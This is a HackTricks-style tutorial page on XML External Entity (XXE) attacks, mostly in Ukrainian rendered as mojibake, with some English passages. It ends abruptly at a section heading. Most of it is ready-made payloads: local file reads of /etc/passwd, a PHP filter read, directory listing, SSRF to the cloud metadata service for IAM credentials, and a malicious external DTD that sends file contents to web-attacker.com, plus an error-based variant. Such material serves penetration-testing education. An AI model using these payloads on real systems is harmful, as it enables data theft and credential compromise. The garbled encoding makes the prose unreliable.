# XXE - XEE - XML External Entity

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## XML –û—Å–Ω–æ–≤–∏

XML - —Ü–µ –º–æ–≤–∞ —Ä–æ–∑–º—ñ—Ç–∫–∏, –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∞ –¥–ª—è –∑–±–µ—Ä—ñ–≥–∞–Ω–Ω—è —Ç–∞ —Ç—Ä–∞–Ω—Å–ø–æ—Ä—Ç—É–≤–∞–Ω–Ω—è –¥–∞–Ω–∏—Ö, —â–æ –º–∞—î –≥–Ω—É—á–∫—É —Å—Ç—Ä—É–∫—Ç—É—Ä—É, —è–∫–∞ –¥–æ–∑–≤–æ–ª—è—î –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –æ–ø–∏—Å–æ–≤–æ –Ω–∞–∑–≤–∞–Ω—ñ —Ç–µ–≥–∏. –í–æ–Ω–∞ –≤—ñ–¥—Ä—ñ–∑–Ω—è—î—Ç—å—Å—è –≤—ñ–¥ HTML —Ç–∏–º, —â–æ –Ω–µ –æ–±–º–µ–∂–µ–Ω–∞ –Ω–∞–±–æ—Ä–æ–º –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ –≤–∏–∑–Ω–∞—á–µ–Ω–∏—Ö —Ç–µ–≥—ñ–≤. –ó–Ω–∞—á–µ–Ω–Ω—è XML –∑–º–µ–Ω—à–∏–ª–æ—Å—è –∑ –ø–æ—è–≤–æ—é JSON, –Ω–µ–∑–≤–∞–∂–∞—é—á–∏ –Ω–∞ —ó—ó –ø–æ—á–∞—Ç–∫–æ–≤—É —Ä–æ–ª—å —É —Ç–µ—Ö–Ω–æ–ª–æ–≥—ñ—ó AJAX.

* **–ü—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–Ω—è –¥–∞–Ω–∏—Ö —á–µ—Ä–µ–∑ —Å—É—Ç–Ω–æ—Å—Ç—ñ**: –°—É—Ç–Ω–æ—Å—Ç—ñ –≤ XML –¥–æ–∑–≤–æ–ª—è—é—Ç—å –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è—Ç–∏ –¥–∞–Ω—ñ, –≤–∫–ª—é—á–∞—é—á–∏ —Å–ø–µ—Ü—ñ–∞–ª—å–Ω—ñ —Å–∏–º–≤–æ–ª–∏, —Ç–∞–∫—ñ —è–∫ `&lt;` —Ç–∞ `&gt;`, —è–∫—ñ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—é—Ç—å `<` —Ç–∞ `>`, —â–æ–± —É–Ω–∏–∫–Ω—É—Ç–∏ –∫–æ–Ω—Ñ–ª—ñ–∫—Ç—É –∑ —Å–∏—Å—Ç–µ–º–æ—é —Ç–µ–≥—ñ–≤ XML.
* **–í–∏–∑–Ω–∞—á–µ–Ω–Ω—è –µ–ª–µ–º–µ–Ω—Ç—ñ–≤ XML**: XML –¥–æ–∑–≤–æ–ª—è—î –≤–∏–∑–Ω–∞—á–∞—Ç–∏ —Ç–∏–ø–∏ –µ–ª–µ–º–µ–Ω—Ç—ñ–≤, –æ–ø–∏—Å—É—é—á–∏, —è–∫ –µ–ª–µ–º–µ–Ω—Ç–∏ –ø–æ–≤–∏–Ω–Ω—ñ –±—É—Ç–∏ —Å—Ç—Ä—É–∫—Ç—É—Ä–æ–≤–∞–Ω—ñ —Ç–∞ —è–∫–∏–π –≤–º—ñ—Å—Ç –≤–æ–Ω–∏ –º–æ–∂—É—Ç—å –º—ñ—Å—Ç–∏—Ç–∏, –≤—ñ–¥ –±—É–¥—å-—è–∫–æ–≥–æ —Ç–∏–ø—É –≤–º—ñ—Å—Ç—É –¥–æ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏—Ö –¥–æ—á—ñ—Ä–Ω—ñ—Ö –µ–ª–µ–º–µ–Ω—Ç—ñ–≤.
* **–í–∏–∑–Ω–∞—á–µ–Ω–Ω—è —Ç–∏–ø—É –¥–æ–∫—É–º–µ–Ω—Ç–∞ (DTD)**: DTD —î –≤–∞–∂–ª–∏–≤–∏–º–∏ –≤ XML –¥–ª—è –≤–∏–∑–Ω–∞—á–µ–Ω–Ω—è —Å—Ç—Ä—É–∫—Ç—É—Ä–∏ –¥–æ–∫—É–º–µ–Ω—Ç–∞ —Ç–∞ —Ç–∏–ø—ñ–≤ –¥–∞–Ω–∏—Ö, —è–∫—ñ –≤—ñ–Ω –º–æ–∂–µ –º—ñ—Å—Ç–∏—Ç–∏. –í–æ–Ω–∏ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–Ω—É—Ç—Ä—ñ—à–Ω—ñ–º–∏, –∑–æ–≤–Ω—ñ—à–Ω—ñ–º–∏ –∞–±–æ –∫–æ–º–±—ñ–Ω–∞—Ü—ñ—î—é, –≤–∫–∞–∑—É—é—á–∏, —è–∫ –¥–æ–∫—É–º–µ–Ω—Ç–∏ —Ñ–æ—Ä–º—É—é—Ç—å—Å—è —Ç–∞ –ø–µ—Ä–µ–≤—ñ—Ä—è—é—Ç—å—Å—è.
* **–ö–æ—Ä–∏—Å—Ç—É–≤–∞—Ü—å–∫—ñ —Ç–∞ –∑–æ–≤–Ω—ñ—à–Ω—ñ —Å—É—Ç–Ω–æ—Å—Ç—ñ**: XML –ø—ñ–¥—Ç—Ä–∏–º—É—î —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—Ü—å–∫–∏—Ö —Å—É—Ç–Ω–æ—Å—Ç–µ–π —É DTD –¥–ª—è –≥–Ω—É—á–∫–æ–≥–æ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–Ω—è –¥–∞–Ω–∏—Ö. –ó–æ–≤–Ω—ñ—à–Ω—ñ —Å—É—Ç–Ω–æ—Å—Ç—ñ, –≤–∏–∑–Ω–∞—á–µ–Ω—ñ –∑ URL, –≤–∏–∫–ª–∏–∫–∞—é—Ç—å –ø—Ä–æ–±–ª–µ–º–∏ –±–µ–∑–ø–µ–∫–∏, –æ—Å–æ–±–ª–∏–≤–æ –≤ –∫–æ–Ω—Ç–µ–∫—Å—Ç—ñ –∞—Ç–∞–∫ XML External Entity (XXE), —è–∫—ñ –µ–∫—Å–ø–ª—É–∞—Ç—É—é—Ç—å —Å–ø–æ—Å—ñ–±, —è–∫–∏–º XML –ø–∞—Ä—Å–µ—Ä–∏ –æ–±—Ä–æ–±–ª—è—é—Ç—å –∑–æ–≤–Ω—ñ—à–Ω—ñ –¥–∂–µ—Ä–µ–ª–∞ –¥–∞–Ω–∏—Ö: `<!DOCTYPE foo [ <!ENTITY myentity "value" > ]>`
* **–í–∏—è–≤–ª–µ–Ω–Ω—è XXE –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –ø–∞—Ä–∞–º–µ—Ç—Ä–∏—á–Ω–∏—Ö —Å—É—Ç–Ω–æ—Å—Ç–µ–π**: –î–ª—è –≤–∏—è–≤–ª–µ–Ω–Ω—è –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π XXE, –æ—Å–æ–±–ª–∏–≤–æ –∫–æ–ª–∏ –∑–≤–∏—á–∞–π–Ω—ñ –º–µ—Ç–æ–¥–∏ –Ω–µ –ø—Ä–∞—Ü—é—é—Ç—å —á–µ—Ä–µ–∑ –∑–∞—Ö–æ–¥–∏ –±–µ–∑–ø–µ–∫–∏ –ø–∞—Ä—Å–µ—Ä–∞, –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä–∏—á–Ω—ñ —Å—É—Ç–Ω–æ—Å—Ç—ñ XML. –¶—ñ —Å—É—Ç–Ω–æ—Å—Ç—ñ –¥–æ–∑–≤–æ–ª—è—é—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ç–µ—Ö–Ω—ñ–∫–∏ –≤–∏—è–≤–ª–µ–Ω–Ω—è –ø–æ–∑–∞ –∫–∞–Ω–∞–ª–æ–º, —Ç–∞–∫—ñ —è–∫ —ñ–Ω—ñ—Ü—ñ—é–≤–∞–Ω–Ω—è DNS –∑–∞–ø–∏—Ç—ñ–≤ –∞–±–æ HTTP –∑–∞–ø–∏—Ç—ñ–≤ –¥–æ –∫–æ–Ω—Ç—Ä–æ–ª—å–æ–≤–∞–Ω–æ–≥–æ –¥–æ–º–µ–Ω—É, —â–æ–± –ø—ñ–¥—Ç–≤–µ—Ä–¥–∏—Ç–∏ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å.
* `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>`
* `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://attacker.com" > ]>`

## –û—Å–Ω–æ–≤–Ω—ñ –∞—Ç–∞–∫–∏

[**–ë—ñ–ª—å—à—ñ—Å—Ç—å —Ü–∏—Ö –∞—Ç–∞–∫ –±—É–ª–∏ –ø—Ä–æ—Ç–µ—Å—Ç–æ–≤–∞–Ω—ñ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —á—É–¥–æ–≤–∏—Ö –ª–∞–±–æ—Ä–∞—Ç–æ—Ä—ñ–π Portswiggers XEE: https://portswigger.net/web-security/xxe**](https://portswigger.net/web-security/xxe)

### –¢–µ—Å—Ç –Ω–æ–≤–æ—ó —Å—É—Ç–Ω–æ—Å—Ç—ñ

–£ —Ü—ñ–π –∞—Ç–∞—Ü—ñ —è –∑–±–∏—Ä–∞—é—Å—è –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ –ø—Ä–∞—Ü—é—î –ø—Ä–æ—Å—Ç–∞ –Ω–æ–≤–∞ –¥–µ–∫–ª–∞—Ä–∞—Ü—ñ—è –°–£–¢–ù–û–°–¢–Ü.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<stockCheck>
<productId>&toreplace;</productId>
<storeId>1</storeId>
</stockCheck>
```
![](<../.gitbook/assets/image (870).png>)

### –ß–∏—Ç–∞–Ω–Ω—è —Ñ–∞–π–ª—É

–°–ø—Ä–æ–±—É—î–º–æ –ø—Ä–æ—á–∏—Ç–∞—Ç–∏ `/etc/passwd` —Ä—ñ–∑–Ω–∏–º–∏ —Å–ø–æ—Å–æ–±–∞–º–∏. –î–ª—è Windows –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –ø—Ä–æ—á–∏—Ç–∞—Ç–∏: `C:\windows\system32\drivers\etc\hosts`

–£ —Ü—å–æ–º—É –ø–µ—Ä—à–æ–º—É –≤–∏–ø–∞–¥–∫—É –∑–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ SYSTEM "_\*\*file:///\*\*etc/passwd_" —Ç–∞–∫–æ–∂ –±—É–¥–µ –ø—Ä–∞—Ü—é–≤–∞—Ç–∏.
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```
![](<../.gitbook/assets/image (86).png>)

–¶–µ–π –¥—Ä—É–≥–∏–π –≤–∏–ø–∞–¥–æ–∫ –º–∞—î –±—É—Ç–∏ –∫–æ—Ä–∏—Å–Ω–∏–º –¥–ª—è –≤–∏—Ç—è–≥—É–≤–∞–Ω–Ω—è —Ñ–∞–π–ª—É, —è–∫—â–æ –≤–µ–±-—Å–µ—Ä–≤–µ—Ä –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î PHP (–Ω–µ –≤–∏–ø–∞–¥–æ–∫ –ª–∞–±–æ—Ä–∞—Ç–æ—Ä—ñ–π Portswigger)
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```
–£ —Ü—å–æ–º—É —Ç—Ä–µ—Ç—å–æ–º—É –≤–∏–ø–∞–¥–∫—É –∑–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –º–∏ –æ–≥–æ–ª–æ—à—É—î–º–æ `Element stockCheck` —è–∫ ANY
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<stockCheck>
<productId>&file;</productId>
<storeId>1</storeId>
</stockCheck3>
```
![](<../.gitbook/assets/image (753).png>)

### –ü–µ—Ä–µ–ª—ñ–∫ –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ–π

–£ **Java**-–±–∞–∑–æ–≤–∞–Ω–∏—Ö –¥–æ–¥–∞—Ç–∫–∞—Ö –º–æ–∂–µ –±—É—Ç–∏ –º–æ–∂–ª–∏–≤–∏–º **–ø–µ—Ä–µ–ª—ñ—á–∏—Ç–∏ –≤–º—ñ—Å—Ç –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—ó** —á–µ—Ä–µ–∑ XXE –∑ –∫–æ—Ä–∏—Å–Ω–∏–º –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è–º, —è–∫ (–ø—Ä–æ—Å—Ç–æ –∑–∞–ø–∏—Ç—É—é—á–∏ –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—é –∑–∞–º—ñ—Å—Ç—å —Ñ–∞–π–ª—É):
```xml
<!-- Root / -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>

<!-- /etc/ -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
```
### SSRF

XXE –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–æ –¥–ª—è –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è SSRF –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Ö–º–∞—Ä–∏
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
### Blind SSRF

–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ **—Ä–∞–Ω—ñ—à–µ –∑–≥–∞–¥–∞–Ω—É —Ç–µ—Ö–Ω—ñ–∫—É**, –≤–∏ –º–æ–∂–µ—Ç–µ –∑–º—É—Å–∏—Ç–∏ —Å–µ—Ä–≤–µ—Ä –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ —Å–µ—Ä–≤–µ—Ä–∞, —è–∫–∏–π –≤–∏ –∫–æ–Ω—Ç—Ä–æ–ª—é—î—Ç–µ, —â–æ–± –ø–æ–∫–∞–∑–∞—Ç–∏, —â–æ –≤—ñ–Ω –≤—Ä–∞–∑–ª–∏–≤–∏–π. –ê–ª–µ, —è–∫—â–æ —Ü–µ –Ω–µ –ø—Ä–∞—Ü—é—î, –º–æ–∂–ª–∏–≤–æ, —Ü–µ —Ç–æ–º—É, —â–æ **XML-–µ–Ω—Ç–∏—Ç–µ—Ç–∏ –Ω–µ –¥–æ–∑–≤–æ–ª–µ–Ω—ñ**, –≤ —Ç–∞–∫–æ–º—É –≤–∏–ø–∞–¥–∫—É –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **XML-–ø–∞—Ä–∞–º–µ—Ç—Ä–∏—á–Ω—ñ –µ–Ω—Ç–∏—Ç–µ—Ç–∏**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### "–°–ª—ñ–ø–∏–π" SSRF - –í–∏—Ç—ñ–∫ –¥–∞–Ω–∏—Ö –ø–æ–∑–∞ –∫–∞–Ω–∞–ª–æ–º

**–£ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É –º–∏ –∑–º—É—Å–∏–º–æ —Å–µ—Ä–≤–µ—Ä –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –Ω–æ–≤–∏–π DTD –∑ —à–∫—ñ–¥–ª–∏–≤–∏–º –∫–æ—Ä–∏—Å–Ω–∏–º –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è–º, —è–∫–µ –Ω–∞–¥—ñ—à–ª–µ –≤–º—ñ—Å—Ç —Ñ–∞–π–ª—É —á–µ—Ä–µ–∑ HTTP –∑–∞–ø–∏—Ç (–¥–ª—è –±–∞–≥–∞—Ç–æ—Ä—è–¥–∫–æ–≤–∏—Ö —Ñ–∞–π–ª—ñ–≤ –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –≤–∏—Ç—è–≥—Ç–∏ –π–æ–≥–æ —á–µ—Ä–µ–∑ \_ftp://**\_ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ü–µ–π –±–∞–∑–æ–≤–∏–π —Å–µ—Ä–≤–µ—Ä, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥ [**xxe-ftp-server.rb**](https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb)**). –¶–µ –ø–æ—è—Å–Ω–µ–Ω–Ω—è –±–∞–∑—É—î—Ç—å—Å—è –Ω–∞** [**Portswiggers lab here**](https://portswigger.net/web-security/xxe/blind)**.**

–£ –¥–∞–Ω–æ–º—É —à–∫—ñ–¥–ª–∏–≤–æ–º—É DTD –ø—Ä–æ–≤–æ–¥–∏—Ç—å—Å—è —Å–µ—Ä—ñ—è –∫—Ä–æ–∫—ñ–≤ –¥–ª—è –≤–∏—Ç–æ–∫—É –¥–∞–Ω–∏—Ö:

### –ü—Ä–∏–∫–ª–∞–¥ —à–∫—ñ–¥–ª–∏–≤–æ–≥–æ DTD:

–°—Ç—Ä—É–∫—Ç—É—Ä–∞ —Ç–∞–∫–∞:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
The steps executed by this DTD include:

1. **Definition of Parameter Entities:**
* An XML parameter entity, `%file`, is created, reading the content of the `/etc/hostname` file.
* Another XML parameter entity, `%eval`, is defined. It dynamically declares a new XML parameter entity, `%exfiltrate`. The `%exfiltrate` entity is set to make an HTTP request to the attacker's server, passing the content of the `%file` entity within the query string of the URL.
2. **Execution of Entities:**
* The `%eval` entity is utilized, leading to the execution of the dynamic declaration of the `%exfiltrate` entity.
* The `%exfiltrate` entity is then used, triggering an HTTP request to the specified URL with the file's contents.

The attacker hosts this malicious DTD on a server under their control, typically at a URL like `http://web-attacker.com/malicious.dtd`.

**XXE Payload:** –©–æ–± –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ –≤—Ä–∞–∑–ª–∏–≤–∏–π –¥–æ–¥–∞—Ç–æ–∫, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –Ω–∞–¥—Å–∏–ª–∞—î XXE payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
–¶–µ–π payload –≤–∏–∑–Ω–∞—á–∞—î XML –ø–∞—Ä–∞–º–µ—Ç—Ä–∏—á–Ω—É —Å—É—Ç–Ω—ñ—Å—Ç—å `%xxe` —ñ –≤–∫–ª—é—á–∞—î —ó—ó –≤ DTD. –ö–æ–ª–∏ —ó—ó –æ–±—Ä–æ–±–ª—è—î XML –ø–∞—Ä—Å–µ—Ä, —Ü–µ–π payload –æ—Ç—Ä–∏–º—É—î –∑–æ–≤–Ω—ñ—à–Ω—ñ–π DTD –∑ —Å–µ—Ä–≤–µ—Ä–∞ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞. –ü–∞—Ä—Å–µ—Ä –ø–æ—Ç—ñ–º —ñ–Ω—Ç–µ—Ä–ø—Ä–µ—Ç—É—î DTD –≤–±—É–¥–æ–≤–∞–Ω–æ, –≤–∏–∫–æ–Ω—É—é—á–∏ –∫—Ä–æ–∫–∏, –≤–∏–∫–ª–∞–¥–µ–Ω—ñ –≤ —à–∫—ñ–¥–ª–∏–≤–æ–º—É DTD, —â–æ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ –µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—ó —Ñ–∞–π–ª—É `/etc/hostname` –Ω–∞ —Å–µ—Ä–≤–µ—Ä –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞.

### Error Based(External DTD)

**–£ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É –º–∏ –∑–º—É—Å–∏–º–æ —Å–µ—Ä–≤–µ—Ä –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ —à–∫—ñ–¥–ª–∏–≤–∏–π DTD, —è–∫–∏–π –ø–æ–∫–∞–∂–µ –≤–º—ñ—Å—Ç —Ñ–∞–π–ª—É –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –ø—Ä–æ –ø–æ–º–∏–ª–∫—É (—Ü–µ –¥—ñ–π—Å–Ω–æ –ª–∏—à–µ –≤ —Ç–æ–º—É –≤–∏–ø–∞–¥–∫—É, —è–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –±–∞—á–∏—Ç–∏ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –ø—Ä–æ –ø–æ–º–∏–ª–∫–∏).** [**–ü—Ä–∏–∫–ª–∞–¥ –∑–≤—ñ–¥—Å–∏.**](https://portswigger.net/web-security/xxe/blind)

–ü–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –ø—Ä–æ –ø–æ–º–∏–ª–∫—É –ø–∞—Ä—Å–∏–Ω–≥—É XML, —è–∫–µ —Ä–æ–∑–∫—Ä–∏–≤–∞—î –≤–º—ñ—Å—Ç —Ñ–∞–π–ª—É `/etc/passwd`, –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–ª–∏–∫–∞–Ω–µ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —à–∫—ñ–¥–ª–∏–≤–æ–≥–æ –∑–æ–≤–Ω—ñ—à–Ω—å–æ–≥–æ –≤–∏–∑–Ω–∞—á–µ–Ω–Ω—è —Ç–∏–ø—É –¥–æ–∫—É–º–µ–Ω—Ç–∞ (DTD). –¶–µ –¥–æ—Å—è–≥–∞—î—Ç—å—Å—è —á–µ—Ä–µ–∑ –Ω–∞—Å—Ç—É–ø–Ω—ñ –∫—Ä–æ–∫–∏:

1. –í–∏–∑–Ω–∞—á–∞—î—Ç—å—Å—è XML –ø–∞—Ä–∞–º–µ—Ç—Ä–∏—á–Ω–∞ —Å—É—Ç–Ω—ñ—Å—Ç—å –∑ –Ω–∞–∑–≤–æ—é `file`, —è–∫–∞ –º—ñ—Å—Ç–∏—Ç—å –≤–º—ñ—Å—Ç —Ñ–∞–π–ª—É `/etc/passwd`.
2. –í–∏–∑–Ω–∞—á–∞—î—Ç—å—Å—è XML –ø–∞—Ä–∞–º–µ—Ç—Ä–∏—á–Ω–∞ —Å—É—Ç–Ω—ñ—Å—Ç—å –∑ –Ω–∞–∑–≤–æ—é `eval`, —â–æ –≤–∫–ª—é—á–∞—î –¥–∏–Ω–∞–º—ñ—á–Ω–µ –≤–∏–∑–Ω–∞—á–µ–Ω–Ω—è –¥–ª—è —ñ–Ω—à–æ—ó XML –ø–∞—Ä–∞–º–µ—Ç—Ä–∏—á–Ω–æ—ó —Å—É—Ç–Ω–æ—Å—Ç—ñ –∑ –Ω–∞–∑–≤–æ—é `error`. –¶—è —Å—É—Ç–Ω—ñ—Å—Ç—å `error`, –∫–æ–ª–∏ —ó—ó –æ—Ü—ñ–Ω—é—é—Ç—å, –Ω–∞–º–∞–≥–∞—î—Ç—å—Å—è –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –Ω–µ—ñ—Å–Ω—É—é—á–∏–π —Ñ–∞–π–ª, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –≤–º—ñ—Å—Ç —Å—É—Ç–Ω–æ—Å—Ç—ñ `file` —è–∫ –π–æ–≥–æ —ñ–º'—è.
3. –í–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è —Å—É—Ç–Ω—ñ—Å—Ç—å `eval`, —â–æ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ –¥–∏–Ω–∞–º—ñ—á–Ω–æ–≥–æ –≤–∏–∑–Ω–∞—á–µ–Ω–Ω—è —Å—É—Ç–Ω–æ—Å—Ç—ñ `error`.
4. –í–∏–∫–ª–∏–∫ —Å—É—Ç–Ω–æ—Å—Ç—ñ `error` –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ —Å–ø—Ä–æ–±–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –Ω–µ—ñ—Å–Ω—É—é—á–∏–π —Ñ–∞–π–ª, —â–æ –≤–∏–∫–ª–∏–∫–∞—î –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –ø—Ä–æ –ø–æ–º–∏–ª–∫—É, —è–∫–µ –º—ñ—Å—Ç–∏—Ç—å –≤–º—ñ—Å—Ç —Ñ–∞–π–ª—É `/etc/passwd` —è–∫ —á–∞—Å—Ç–∏–Ω—É —ñ–º–µ–Ω—ñ —Ñ–∞–π–ª—É.

–®–∫—ñ–¥–ª–∏–≤–∏–π –∑–æ–≤–Ω—ñ—à–Ω—ñ–π DTD –º–æ–∂–Ω–∞ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ XML:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
Upon execution, the web server's response should include an error message displaying the contents of the `/etc/passwd` file.

![](<../.gitbook/assets/image (809).png>)

_**–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –∑–æ–≤–Ω—ñ—à–Ω—ñ–π DTD –¥–æ–∑–≤–æ–ª—è—î –Ω–∞–º –≤–∫–ª—é—á–∞—Ç–∏ –æ–¥–Ω—É —Å—É—Ç–Ω—ñ—Å—Ç—å –≤—Å–µ—Ä–µ–¥–∏–Ω—É –¥—Ä—É–≥–æ—ó (****`eval`****), –∞–ª–µ —Ü–µ –∑–∞–±–æ—Ä–æ–Ω–µ–Ω–æ –≤ –≤–Ω—É—Ç—Ä—ñ—à–Ω—å–æ–º—É DTD. –¢–æ–º—É –≤–∏ –Ω–µ –º–æ–∂–µ—Ç–µ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ –ø–æ–º–∏–ª–∫—É –±–µ–∑ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –∑–æ–≤–Ω—ñ—à–Ω—å–æ–≥–æ DTD (–∑–∞–∑–≤–∏—á–∞–π).**_

### **–ü–æ–º–∏–ª–∫–∞ –Ω–∞ –æ—Å–Ω–æ–≤—ñ (—Å–∏—Å—Ç–µ–º–Ω–∏–π DTD)**

